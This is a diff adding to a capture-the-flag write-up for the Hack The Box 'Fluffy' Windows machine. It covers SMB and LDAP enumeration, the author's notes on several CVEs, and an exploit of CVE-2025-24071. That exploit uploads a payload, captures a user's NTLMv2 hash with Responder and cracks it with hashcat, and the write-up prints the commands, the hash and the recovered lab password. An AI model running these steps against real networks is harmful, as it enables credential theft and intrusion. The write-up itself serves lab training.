@@ -1,6 +1,6 @@
 # Fluffy
 
-As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman` / J0elTHEM4n1990!
+As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!
 
 ## Enumeration
 
@@ -68,6 +68,23 @@ smb: \> pwd
 Current directory is \\10.10.11.69\IT\
 ```
 
+Checking the changes from everything.exe shows something promising:
+
+```
+Friday, 20 June 2025: Version 1.4.1.1028
+	fixed a crash when getting help text from a context menu item that throws an exception.
+	updated localization.
+
+Friday, 23 May 2025: Version 1.4.1.1027
+	updated localization.
+	improved security against dll hijacking.
+
+Thursday, 1 August 2024: Version 1.4.1.1026
+	updated localization.
+```
+
+Looks like version `1.4.1.1026` is vulnerable to dll hijacking.
+
 In the SYSVOL, there's also an interesting file:
 
 ```shell
@@ -91,11 +108,28 @@ We'll now exfiliate the files from the samba share to our computer to analyze th
 The PDF warns the sysadm to patch the system to mitigate the impact of the following CVEs:
 
 CVE-2025-24996 - Critical
+
+Looks like this vulnerability allows a user to trick NTLM into connect as another user. There's no POC available, however, ChatGPT suggest to use https://github.com/p0dalirius/Coercer to check if we're lucky.
+
 CVE-2025-24071 - Critical
+
+Looks like there's a poc for CVE-2025-24071: https://github.com/DeshanFer94/CVE-2025-24071-POC-NTLMHashDisclosure-. The idea is the attacker will try to perform smb auth and the vulnerability will leak the NTLMv2 hash of the user, since we have a bunch of users, we can try to guess the password from the leaked hashes.
+
 CVE-2025-46785 - High
+
+Related with a Buffer overflow in Zoom Workplace application. Maybe to be used for privilege escalation?
+
 CVE-2025-29968 - High
+
+Looks like denial of service vulnerability
+
 CVE-2025-21193 - Medium
+
+Spoofing in Active Directory, might be interesting
+
 CVE-2025-3445  - Low
+
+Relates to mholt/archiver golang
 
 Most likely one of these vulnerabilities will be useful to us
 
@@ -115,3 +149,40 @@ And discard garbage data:
 ```bash
 cat users|grep -i user |rev |cut -f2 -d ' ' |rev |grep FLUFFY |cut -f2 -d '\' |grep -Ev (DC|SVC) |tail -n +4 > users.txt
 ```
+
+### LDAP enumeration
+
+```bash
+ldapdomaindump fluffy.htb -u 'fluffy.htb\j.fleischman' -p 'J0elTHEM4n1990!' --no-json --no-grep
+```
+
+This produces the list of computers, groups, users and permissions.
+
+## CVE-2025-24071
+
+We managed to fabricate the payload required and upload it via SMB. 
+
+```bash
+python3 CVE-2025-24071.py -i 10.10.15.19 -n testpayload -o ./output --keep 
+```
+
+
+When listening for events with responder, we get the NTLM Hash of user p.agila
+
+```
+[+] Listening for events...                                                                                                                                                                                                                 
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.69
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:bd8f7fef990474ff:C7C0CB9CAC9525F2D208E32C10E7C248:0101000000000000001DAD238801DC01142342D76B81FA3800000000020008004E0058003800370001001E00570049004E002D0041005A00310051004E0056003200410030004400490004003400570049004E002D0041005A00310051004E005600320041003000440049002E004E005800380037002E004C004F00430041004C00030014004E005800380037002E004C004F00430041004C00050014004E005800380037002E004C004F00430041004C0007000800001DAD238801DC0106000400020000000800300030000000000000000100000000200000281213D3D4900283CBDD465132F4069EAD5996FF744C8BC81B4B59245480EF190A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00310039000000000000000000
+```
+
+With hashcat and rockyou, we are able to retrieve the password: 
+
+```bash
+hashcat --show -m 5600 -a 0 pagilahash /usr/share/wordlists/rockyou.txt
+```
+
+prometheusx-303
+
+From the LDAP dump, we know that this user is a Service Account Manager.
